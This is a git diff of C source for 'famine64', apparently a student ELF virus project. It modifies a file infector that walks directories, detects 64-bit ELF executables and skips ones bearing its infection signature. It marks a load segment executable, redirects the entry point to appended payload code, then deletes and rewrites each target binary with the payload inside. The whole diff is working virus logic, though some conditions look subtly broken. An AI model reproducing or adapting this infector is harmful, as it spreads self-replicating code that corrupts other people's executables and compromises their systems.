@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/05/31 04:10:02 by root             ###   ########.fr       */
+/*   Updated: 2018/06/07 17:56:11 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -33,7 +33,7 @@
 void			find_files(char *dir);
 void			get_dat_elf(char *dir, char *file);
 void			pack_dat_elf(char *path, int size, char *data);
-int				check_signature(char *data, Elf64_Phdr *iprogram);
+int				dat_elf_is_infected(char *data);
 void			famine64_func(void);
 extern uint32_t	famine64_size;
 
@@ -125,36 +125,26 @@ void	get_dat_elf(char *dir, char *file)
 void		pack_dat_elf(char *path, int size, char *data)
 {
 	if (data[0] == 0x7f && data[1] == 'E' && data[2] == 'L' && data[3] == 'F'	&&
-		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3))
-		// Ajouter le check de signature de binaire
+		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3) &&
+		!dat_elf_is_infected(data))
 	{
 
-		/* 1. Find the highest memory mapped PT_LOAD segment */
+		/* 1. Find a memory mapped PT_LOAD segment free space */
 		size_t	phoff = ((Elf64_Ehdr *)data)->e_phoff;
 		Elf64_Phdr *program = (Elf64_Phdr *)(data + phoff);
 		Elf64_Phdr *iprogram = NULL;
 		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++) {
 			if (program[i].p_type == PT_LOAD) {
-				if (!iprogram ||
-					program[i].p_vaddr > iprogram->p_vaddr) {
+				if (program[i].p_vaddr + program[i].p_memsz < program[i].p_vaddr + program[i].p_align) {
 					iprogram = &program[i];
+					break ;
 				}
 			}
 		}
-		if (iprogram == NULL)
-			return ;
-		if (check_signature(data, iprogram))
+		if (iprogram == NULL) /* ADD A NEW SEGMENT will be smarter */
 			return ;
 
-		syscall(UNLINK, path);
-		/* Extra: Change the offset of sections higher than our code offset, for debug. */
-		size_t	shoff = ((Elf64_Ehdr *)data)->e_shoff;
-		Elf64_Shdr *section = (Elf64_Shdr *)(data + shoff);
-		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
-			if (section[i].sh_offset >= iprogram->p_offset + iprogram->p_memsz) {
-				section[i].sh_offset += famine64_size;
-			}
-		}
+		syscall(UNLINK, path); /* Erase the file from system tree */
 
 		/* 2. Compute the virtual address of our code */
 		Elf64_Addr new_entry = iprogram->p_vaddr + iprogram->p_memsz;
@@ -162,20 +152,23 @@ void		pack_dat_elf(char *path, int size, char *data)
 		/* 3. Change the elf header */
 		Elf64_Addr old_entry = ((Elf64_Ehdr *)data)->e_entry;
 		((Elf64_Ehdr *)data)->e_entry = new_entry;
-		((Elf64_Ehdr *)data)->e_shoff += famine64_size;
 
 		/* 4. Change the program header */
-		if ((iprogram->p_flags & PF_X) == 0)
-			iprogram->p_flags |= PF_X;
+		/* Make our section readable and executable if she's not */
+		iprogram->p_flags |= PF_R;
+		iprogram->p_flags |= PF_X;
 		iprogram->p_memsz += famine64_size;
-		iprogram->p_filesz = iprogram->p_memsz;
+		iprogram->p_filesz += famine64_size;
 
+		/* Re-create the file */
+		/* Nicer way will be to get the file permissions and assign it like it was */
 		int fd = syscall(OPEN, path, O_WRONLY|O_CREAT, 0755);
 		if (fd == -1){
 			write(1, "OPEN file failed\n", 17);
 			return ;
 		}
-		/* Get the offset in file to write our code */
+
+		/* Re-write the file */
 		size_t off = iprogram->p_offset + iprogram->p_memsz - famine64_size;
 		if (write(fd, data, off) < 0)
 			return ;
@@ -183,17 +176,33 @@ void		pack_dat_elf(char *path, int size, char *data)
 			return ;
 		if (write(fd, &old_entry, sizeof(old_entry)) < 0)
 			return ;
+		off += famine64_size;
 		if (write(fd, data + off, size - off) < 0)
 			return ;
 		syscall(CLOSE, fd);
 	}
 }
 
-int		check_signature(char *data, Elf64_Phdr *iprogram)
+int		dat_elf_is_infected(char *data)
 {
-	char *ptr = (data + iprogram->p_offset + iprogram->p_memsz - 16);
+	Elf64_Addr entry = ((Elf64_Ehdr *)data)->e_entry;
+	/* In ELF the entry point look like an address (0x400430) */
+	/* Get the section containing the entry point */
+	Elf64_Shdr *section = (Elf64_Shdr *)(data + ((Elf64_Ehdr *)data)->e_shoff);
+	Elf64_Shdr *isection = NULL;
+	for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
+		if (section[i].sh_addr >= entry && entry < section[i].sh_addr + section[i].sh_size) {
+			isection = &section[i];
+			break ;
+		}
+	}
+	if (isection == NULL)
+		return (1);
+	char *ptr = (data + isection->sh_offset + isection->sh_size - 16);
+	/* Going at the end of the section less 16 bit will point to the first 8 bits of our infection signature */
 	uint32_t sign = *(uint32_t*)ptr;
-	ptr = (data + iprogram->p_offset + iprogram->p_memsz - 12);
+	ptr = (data + isection->sh_offset + isection->sh_size - 12);
+	/* End less 12 bits point to the last 8 bits of our infection signature */
 	uint32_t sign4 = *(uint32_t*)ptr;
 	return (sign == 0x42CAFE42 && sign4 == 0x24EFAC24);
 }
